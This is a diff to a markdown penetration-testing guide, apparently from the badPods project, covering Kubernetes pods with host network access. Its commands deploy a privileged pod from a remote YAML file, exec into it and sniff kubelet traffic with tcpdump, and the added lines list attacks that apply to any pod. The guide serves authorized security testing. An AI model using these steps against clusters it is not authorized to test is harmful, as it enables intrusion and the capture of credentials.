@@ -23,7 +23,7 @@ kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/h
 kubectl -n [namespace] exec -it pod-hostnetwork-only -- bash
 ```
 
-### Post Exploitation 
+# Post Exploitation 
 ```bash
 # Install tcpdump and sniff traffic 
 # Note: If you can't install tools to your pod (no internet access), you will have to change the image in your pod yaml to something that already includes tcpdump, like https://hub.docker.com/r/corfr/tcpdump
@@ -57,3 +57,14 @@ tcpdump -ro kubelet-ro.cap -s0 -A
 # Another option entirely: investigate local services
 curl https://localhost:1234/metrics
 ```
+
+
+#### Attacks that apply to all pods, even without any special permissions
+* Cloud metadata service
+* `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
+* Kubernetes exploits
+* Hunting for vulnerable application/services in the cluster
+
+# Demonstrate Impact
+
+If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the pentration test.
